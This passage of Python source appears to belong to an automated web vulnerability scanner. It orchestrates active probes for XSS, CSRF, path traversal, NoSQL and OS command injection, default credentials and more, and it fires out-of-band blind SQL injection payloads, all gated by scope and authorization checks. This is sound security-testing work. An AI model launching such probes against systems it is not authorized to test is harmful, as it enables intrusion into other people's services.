        stored_xss_endpoints = [
            endpoint for endpoint in (schema_endpoints or [])
            if isinstance(endpoint, dict)
            and str(endpoint.get("method", "")).upper() in XSS_MUTATION_METHODS
            and isinstance(endpoint.get("body"), dict)
            and _string_field_paths(endpoint.get("body"))
        ]
        allowed_class, class_reason = _activation_allowed(
            "Stored XSS"
        )
        if not stored_xss_endpoints:
            await log("[Hunt] Class 25 Stored XSS skipped: no schema-known text mutation endpoints")
        elif not allowed_class:
            await log("[Hunt] Class 25 Stored XSS skipped — {}".format(class_reason))
        elif not scope_policy.config.authenticated_testing_enabled:
            await log("[Hunt] Class 25 Stored XSS skipped: authenticated testing disabled")
        elif not auth_matrix.configured or not auth_matrix.mutations_allowed:
            await log("[Hunt] Class 25 Stored XSS skipped: authorized mutation session required")
        elif throttle.host_dead:
            await log("[Hunt] Class 25 Stored XSS skipped: target is blocking requests")
        else:
            await log("[Hunt] {}/{} Class 25: Stored XSS".format(
                class_idx, total_classes
            ))
            if progress_cb:
                await progress_cb("hunt", class_idx, total_classes, "Stored XSS")
            session_a_headers, _ = auth_matrix.session_headers()
            stored_client = httpx.AsyncClient(
                headers={**BASE_HEADERS, **session_a_headers},
                verify=False,
                follow_redirects=False,
                timeout=REQUEST_TIMEOUT.get(),
                limits=httpx.Limits(max_connections=3),
            )
            try:
                stored_findings = await hunt_stored_xss(
                    stored_client,
                    stored_xss_endpoints,
                    all_urls,
                )
            finally:
                await stored_client.aclose()
            all_findings.extend(stored_findings)
            await log("[Hunt] Stored XSS: {} finding(s)".format(
                len(stored_findings)
            ))

        # ── Class 26: DOM XSS ────────────────────────────────────────────────
        class_idx += 1
        js_urls = [
            url for url in all_urls
            if urlparse(url).path.lower().endswith(".js")
            and ".min.js" not in urlparse(url).path.lower()
        ]
        allowed_class, class_reason = _activation_allowed(
            "DOM XSS"
        )
        if not js_urls:
            await log("[Hunt] Class 26 DOM XSS skipped: no non-minified JavaScript discovered")
        elif not allowed_class:
            await log("[Hunt] Class 26 DOM XSS skipped — {}".format(class_reason))
        elif not scope_policy.config.active_testing_enabled:
            await log("[Hunt] Class 26 DOM XSS skipped: active testing disabled")
        elif throttle.host_dead:
            await log("[Hunt] Class 26 DOM XSS skipped: target is blocking requests")
        else:
            await log("[Hunt] {}/{} Class 26: DOM XSS".format(
                class_idx, total_classes
            ))
            if progress_cb:
                await progress_cb("hunt", class_idx, total_classes, "DOM XSS")
            dom_findings = await hunt_dom_xss(client, js_urls)
            all_findings.extend(dom_findings)
            await log("[Hunt] DOM XSS: {} candidate(s)".format(
                len(dom_findings)
            ))

        # ── Class 27: Blind XSS ──────────────────────────────────────────────
        class_idx += 1
        blind_xss_endpoints = [
            endpoint for endpoint in (schema_endpoints or [])
            if isinstance(endpoint, dict) and _blind_xss_endpoint(endpoint)
        ]
        allowed_class, class_reason = _activation_allowed(
            "Blind XSS"
        )
        if not blind_xss_endpoints:
            await log("[Hunt] Class 27 Blind XSS skipped: no likely deferred-render inputs")
        elif not allowed_class:
            await log("[Hunt] Class 27 Blind XSS skipped — {}".format(class_reason))
        elif not scope_policy.config.authenticated_testing_enabled:
            await log("[Hunt] Class 27 Blind XSS skipped: authenticated testing disabled")
        elif not auth_matrix.configured or not auth_matrix.mutations_allowed:
            await log("[Hunt] Class 27 Blind XSS skipped: authorized mutation session required")
        elif throttle.host_dead:
            await log("[Hunt] Class 27 Blind XSS skipped: target is blocking requests")
        else:
            await log("[Hunt] {}/{} Class 27: Blind XSS".format(
                class_idx, total_classes
            ))
            if progress_cb:
                await progress_cb("hunt", class_idx, total_classes, "Blind XSS")
            session_a_headers, _ = auth_matrix.session_headers()
            blind_client = httpx.AsyncClient(
                headers={**BASE_HEADERS, **session_a_headers},
                verify=False,
                follow_redirects=False,
                timeout=REQUEST_TIMEOUT.get(),
                limits=httpx.Limits(max_connections=2),
            )
            try:
                blind_findings = await hunt_blind_xss(
                    blind_client, blind_xss_endpoints
                )
            finally:
                await blind_client.aclose()
            all_findings.extend(blind_findings)
            await log("[Hunt] Blind XSS: {} submission candidate(s); confirmed only by OOB HTTP callback".format(
                len(blind_findings)
            ))

        # ── Class 28: CSRF ───────────────────────────────────────────────────
        class_idx += 1
        csrf_endpoints = [
            endpoint for endpoint in (schema_endpoints or [])
            if isinstance(endpoint, dict)
            and str(endpoint.get("method", "")).upper() in STATE_CHANGING_METHODS
            and any(
                hint in urlparse(str(endpoint.get("url", ""))).path.lower()
                for hint in CSRF_SENSITIVE_HINTS
            )
        ]
        allowed_class, class_reason = _activation_allowed("CSRF")
        if not csrf_endpoints:
            await log("[Hunt] Class 28 CSRF skipped: no auth-sensitive state-changing endpoints")
        elif not allowed_class:
            await log("[Hunt] Class 28 CSRF skipped — {}".format(class_reason))
        elif not scope_policy.config.authenticated_testing_enabled:
            await log("[Hunt] Class 28 CSRF skipped: authenticated testing disabled")
        elif not auth_matrix.configured or not auth_matrix.mutations_allowed:
            await log("[Hunt] Class 28 CSRF skipped: authorized mutation session required")
        elif throttle.host_dead:
            await log("[Hunt] Class 28 CSRF skipped: target is blocking requests")
        else:
            await log("[Hunt] {}/{} Class 28: CSRF".format(
                class_idx, total_classes
            ))
            if progress_cb:
                await progress_cb("hunt", class_idx, total_classes, "CSRF")
            session_a_headers, _ = auth_matrix.session_headers()
            csrf_client = httpx.AsyncClient(
                headers={**BASE_HEADERS, **session_a_headers},
                verify=False,
                follow_redirects=False,
                timeout=REQUEST_TIMEOUT.get(),
                limits=httpx.Limits(max_connections=2),
            )
            try:
                csrf_findings = await hunt_csrf(
                    csrf_client, csrf_endpoints, all_findings
                )
            finally:
                await csrf_client.aclose()
            all_findings.extend(csrf_findings)
            await log("[Hunt] CSRF: {} finding(s)".format(len(csrf_findings)))

        # ── Class 29: Path Traversal and LFI ─────────────────────────────────
        class_idx += 1
        allowed_class, class_reason = _activation_allowed(
            "Path Traversal and LFI"
        )
        if not allowed_class:
            await log("[Hunt] Class 29 Path Traversal/LFI skipped — {}".format(
                class_reason
            ))
        elif not scope_policy.config.active_testing_enabled:
            await log("[Hunt] Class 29 Path Traversal/LFI skipped: active testing disabled")
        elif throttle.host_dead:
            await log("[Hunt] Class 29 Path Traversal/LFI skipped: target is blocking requests")
        else:
            await log("[Hunt] {}/{} Class 29: Path Traversal and LFI".format(
                class_idx, total_classes
            ))
            if progress_cb:
                await progress_cb(
                    "hunt", class_idx, total_classes, "Path Traversal and LFI"
                )
            session_headers, _ = auth_matrix.session_headers()
            path_client = httpx.AsyncClient(
                headers={**BASE_HEADERS, **session_headers},
                verify=False,
                follow_redirects=False,
                timeout=REQUEST_TIMEOUT.get(),
                limits=httpx.Limits(max_connections=3),
            )
            try:
                traversal_findings = await hunt_path_traversal_lfi(
                    path_client, all_urls, schema_endpoints, base_urls
                )
            finally:
                await path_client.aclose()
            all_findings.extend(traversal_findings)
            await log("[Hunt] Path traversal/LFI: {} finding(s)".format(
                len(traversal_findings)
            ))

        # ── Class 30: NoSQL Injection ────────────────────────────────────────
        class_idx += 1
        nosql_endpoints = [
            endpoint for endpoint in (schema_endpoints or [])
            if isinstance(endpoint, dict)
            and str(endpoint.get("method", "")).upper() == "POST"
            and str(endpoint.get("content_type", "")).lower() == "application/json"
            and isinstance(endpoint.get("body"), dict)
        ]
        allowed_class, class_reason = _activation_allowed(
            "NoSQL Injection"
        )
        if not nosql_endpoints:
            await log("[Hunt] Class 30 NoSQL Injection skipped: no JSON POST endpoints")
        elif not allowed_class:
            await log("[Hunt] Class 30 NoSQL Injection skipped — {}".format(
                class_reason
            ))
        elif not scope_policy.config.authenticated_testing_enabled:
            await log("[Hunt] Class 30 NoSQL Injection skipped: authenticated testing disabled")
        elif not auth_matrix.configured or not auth_matrix.mutations_allowed:
            await log("[Hunt] Class 30 NoSQL Injection skipped: authorized mutation session required")
        elif throttle.host_dead:
            await log("[Hunt] Class 30 NoSQL Injection skipped: target is blocking requests")
        else:
            await log("[Hunt] {}/{} Class 30: NoSQL Injection".format(
                class_idx, total_classes
            ))
            if progress_cb:
                await progress_cb(
                    "hunt", class_idx, total_classes, "NoSQL Injection"
                )
            session_headers, _ = auth_matrix.session_headers()
            nosql_client = httpx.AsyncClient(
                headers={**BASE_HEADERS, **session_headers},
                verify=False,
                follow_redirects=False,
                timeout=httpx.Timeout(8.0),
                limits=httpx.Limits(max_connections=2),
            )
            try:
                nosql_findings = await hunt_nosql_injection(
                    nosql_client, nosql_endpoints
                )
            finally:
                await nosql_client.aclose()
            all_findings.extend(nosql_findings)
            await log("[Hunt] NoSQL injection: {} finding(s)".format(
                len(nosql_findings)
            ))

        # ── Class 31: OS Command Injection ───────────────────────────────────
        class_idx += 1
        command_query_urls = [
            url for url in all_urls
            if any(
                _command_value_candidate(name, value)
                for name, value in _query_candidates(url, COMMAND_PARAM_NAMES)
            )
        ]
        command_json_endpoints = [
            endpoint for endpoint in (schema_endpoints or [])
            if isinstance(endpoint, dict)
            and isinstance(endpoint.get("body"), dict)
            and any(
                _command_value_candidate(path[-1], value)
                for path, value in _body_path_candidates(
                    endpoint.get("body", {}), COMMAND_PARAM_NAMES
                )
            )
        ]
        allowed_class, class_reason = _activation_allowed(
            "OS Command Injection"
        )
        if not command_query_urls and not command_json_endpoints:
            await log("[Hunt] Class 31 OS Command Injection skipped: no command-like parameters")
        elif not allowed_class:
            await log("[Hunt] Class 31 OS Command Injection skipped — {}".format(
                class_reason
            ))
        elif not scope_policy.config.active_testing_enabled:
            await log("[Hunt] Class 31 OS Command Injection skipped: active testing disabled")
        elif throttle.host_dead:
            await log("[Hunt] Class 31 OS Command Injection skipped: target is blocking requests")
        else:
            await log("[Hunt] {}/{} Class 31: OS Command Injection".format(
                class_idx, total_classes
            ))
            if progress_cb:
                await progress_cb(
                    "hunt", class_idx, total_classes, "OS Command Injection"
                )
            session_headers, _ = auth_matrix.session_headers()
            command_client = httpx.AsyncClient(
                headers={**BASE_HEADERS, **session_headers},
                verify=False,
                follow_redirects=False,
                timeout=httpx.Timeout(8.0),
                limits=httpx.Limits(max_connections=2),
            )
            try:
                command_findings = await hunt_os_command_injection(
                    command_client,
                    command_query_urls,
                    command_json_endpoints,
                )
            finally:
                await command_client.aclose()
            all_findings.extend(command_findings)
            await log("[Hunt] OS command injection: {} immediate finding(s); OOB probes confirm during polling".format(
                len(command_findings)
            ))

        # ── Class 32: Host Header Injection ──────────────────────────────────
        class_idx += 1
        allowed_class, class_reason = _activation_allowed(
            "Host Header Injection"
        )
        if not live_hosts:
            await log("[Hunt] Class 32 Host Header Injection skipped: no live hosts")
        elif not allowed_class:
            await log("[Hunt] Class 32 Host Header Injection skipped — {}".format(
                class_reason
            ))
        elif not scope_policy.config.active_testing_enabled:
            await log("[Hunt] Class 32 Host Header Injection skipped: active testing disabled")
        elif throttle.host_dead:
            await log("[Hunt] Class 32 Host Header Injection skipped: target is blocking requests")
        else:
            await log("[Hunt] {}/{} Class 32: Host Header Injection".format(
                class_idx, total_classes
            ))
            if progress_cb:
                await progress_cb(
                    "hunt", class_idx, total_classes, "Host Header Injection"
                )
            host_findings = await hunt_host_header_injection(
                client, live_hosts, all_urls
            )
            all_findings.extend(host_findings)
            await log("[Hunt] Host header injection: {} finding(s)".format(
                len(host_findings)
            ))

        # ── Class 33: CRLF Injection ─────────────────────────────────────────
        class_idx += 1
        allowed_class, class_reason = _activation_allowed(
            "CRLF Injection"
        )
        if not allowed_class:
            await log("[Hunt] Class 33 CRLF Injection skipped — {}".format(
                class_reason
            ))
        elif not scope_policy.config.active_testing_enabled:
            await log("[Hunt] Class 33 CRLF Injection skipped: active testing disabled")
        elif throttle.host_dead:
            await log("[Hunt] Class 33 CRLF Injection skipped: target is blocking requests")
        else:
            await log("[Hunt] {}/{} Class 33: CRLF Injection".format(
                class_idx, total_classes
            ))
            if progress_cb:
                await progress_cb(
                    "hunt", class_idx, total_classes, "CRLF Injection"
                )
            crlf_findings = await hunt_crlf_injection(client, all_urls)
            all_findings.extend(crlf_findings)
            await log("[Hunt] CRLF injection: {} finding(s)".format(
                len(crlf_findings)
            ))

        # ── Class 34: Default Credentials ────────────────────────────────────
        class_idx += 1
        login_urls = [
            url for url in all_urls
            if LOGIN_PATH_RE.search(urlparse(url).path + "/")
        ]
        deep_authorized = scope_policy.normalize_mode(
            scope_policy.config.scan_mode
        ) in {"normal", "intensive_authorized"}
        allowed_class, class_reason = _activation_allowed(
            "Default Credentials"
        )
        if not deep_authorized:
            await log("[Hunt] Class 34 Default Credentials skipped: Deep Authorized Scan required")
        elif not login_urls:
            await log("[Hunt] Class 34 Default Credentials skipped: no login endpoints")
        elif not allowed_class:
            await log("[Hunt] Class 34 Default Credentials skipped — {}".format(
                class_reason
            ))
        elif not scope_policy.config.active_testing_enabled:
            await log("[Hunt] Class 34 Default Credentials skipped: active testing disabled")
        elif throttle.host_dead:
            await log("[Hunt] Class 34 Default Credentials skipped: target is blocking requests")
        else:
            await log("[Hunt] {}/{} Class 34: Default Credentials".format(
                class_idx, total_classes
            ))
            if progress_cb:
                await progress_cb(
                    "hunt", class_idx, total_classes, "Default Credentials"
                )
            default_credential_findings = await hunt_default_credentials(
                client, login_urls, schema_endpoints
            )
            all_findings.extend(default_credential_findings)
            await log("[Hunt] Default credentials: {} confirmed finding(s)".format(
                len(default_credential_findings)
            ))

        # ── Class 35: WebSocket Security ─────────────────────────────────────
        class_idx += 1
        allowed_class, class_reason = _activation_allowed("WebSocket Active Security")
        discovered_ws = list(dict.fromkeys(websocket_urls or []))
        if not allowed_class:
            await log("[Hunt] Class 35 WebSocket Security skipped — {}".format(class_reason))
        elif not scope_policy.config.active_testing_enabled:
            await log("[Hunt] Class 35 WebSocket Security skipped: active testing disabled")
        elif not discovered_ws:
            await log("[Hunt] Class 35 WebSocket Security skipped: no WebSocket URLs discovered")
        elif throttle.host_dead:
            await log("[Hunt] Class 35 WebSocket Security skipped: target is blocking requests")
        else:
            await log("[Hunt] {}/{} Class 35: WebSocket Security".format(class_idx, total_classes))
            if progress_cb:
                await progress_cb("hunt", class_idx, total_classes, "WebSocket Security")
            for ws_url in discovered_ws[:20]:
                all_findings.extend(
                    await test_websocket_security(ws_url, client, scope_policy)
                )

        # ── Class 36: Session Security Analyzer ──────────────────────────────
        class_idx += 1
        allowed_class, class_reason = _activation_allowed("Session Security")
        if not allowed_class:
            await log("[Hunt] Class 36 Session Security skipped — {}".format(class_reason))
        elif not scope_policy.config.active_testing_enabled:
            await log("[Hunt] Class 36 Session Security skipped: active testing disabled")
        elif throttle.host_dead:
            await log("[Hunt] Class 36 Session Security skipped: target is blocking requests")
        else:
            await log("[Hunt] {}/{} Class 36: Session Security".format(class_idx, total_classes))
            if progress_cb:
                await progress_cb("hunt", class_idx, total_classes, "Session Security")
            all_findings.extend(await hunt_session_security(client, all_urls))

        # ── Class 37: Clickjacking ───────────────────────────────────────────
        class_idx += 1
        allowed_class, class_reason = _activation_allowed("Clickjacking")
        if not allowed_class:
            await log("[Hunt] Class 37 Clickjacking skipped — {}".format(class_reason))
        elif not scope_policy.config.active_testing_enabled:
            await log("[Hunt] Class 37 Clickjacking skipped: active testing disabled")
        elif throttle.host_dead:
            await log("[Hunt] Class 37 Clickjacking skipped: target is blocking requests")
        else:
            await log("[Hunt] {}/{} Class 37: Clickjacking".format(class_idx, total_classes))
            if progress_cb:
                await progress_cb("hunt", class_idx, total_classes, "Clickjacking")
            all_findings.extend(await hunt_clickjacking(client, all_urls))

        # ── Class 38: Browser Storage Security ───────────────────────────────
        class_idx += 1
        allowed_class, class_reason = _activation_allowed("Browser Storage Security")
        discovered_js = list(dict.fromkeys(js_urls or []))
        if not allowed_class:
            await log("[Hunt] Class 38 Browser Storage skipped — {}".format(class_reason))
        elif not scope_policy.config.active_testing_enabled:
            await log("[Hunt] Class 38 Browser Storage skipped: active testing disabled")
        elif not discovered_js:
            await log("[Hunt] Class 38 Browser Storage skipped: no JavaScript files discovered")
        elif throttle.host_dead:
            await log("[Hunt] Class 38 Browser Storage skipped: target is blocking requests")
        else:
            await log("[Hunt] {}/{} Class 38: Browser Storage Security".format(class_idx, total_classes))
            if progress_cb:
                await progress_cb("hunt", class_idx, total_classes, "Browser Storage Security")
            all_findings.extend(await hunt_browser_storage(client, discovered_js))

    # Deduplicate by (vuln_type, url)
    seen, dedup = set(), []
    for f in all_findings:
        key = (f["vuln_type"], f["url"])
        if key not in seen:
            seen.add(key)
            dedup.append(f)

    REQUEST_TIMEOUT.reset(timeout_token)
    await log("[Hunt] ━━━ Phase 2 complete: {} raw findings | OOB payloads: {} ━━━".format(
        len(dedup), oob.payload_count))
    return dedup


async def _hunt_oob_sqli(client, urls: list, waf_info: dict, log: Callable) -> list:
    """
    Inject OOB blind SQLi payloads into high-probability parameters.
    These trigger DNS/HTTP callbacks when executed by the DB — detects
    blind SQLi in async/deferred contexts where time-based fails.
    """
    results = []
    sem     = asyncio.Semaphore(4)

    async def test_url(url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return

        for param in list(params.keys())[:4]:
            if param.lower() not in HIGH_PROB_SQLI_PARAMS:
                continue

            payloads = oob.get_sqli_payloads(param, url)
            for dbms, payload in payloads[:2]:   # test 2 per param to save time
                async with sem:
                    test_params        = {k: v[0] for k, v in params.items()}
                    test_params[param] = payload
                    test_url_str       = "{}?{}".format(url.split("?")[0], urlencode(test_params))
                    await tget(client, test_url_str)   # fire and forget — OOB hit captured by poll
                    await asyncio.sleep(0.5)           # brief gap between payloads

    tasks = [test_url(u) for u in urls[:50]]
    await asyncio.gather(*tasks)

    await log("[Hunt] OOB blind SQLi payloads fired — interactions polled at end of Phase 2")
    return results   # actual findings come from oob.poll_interactions() in pipeline
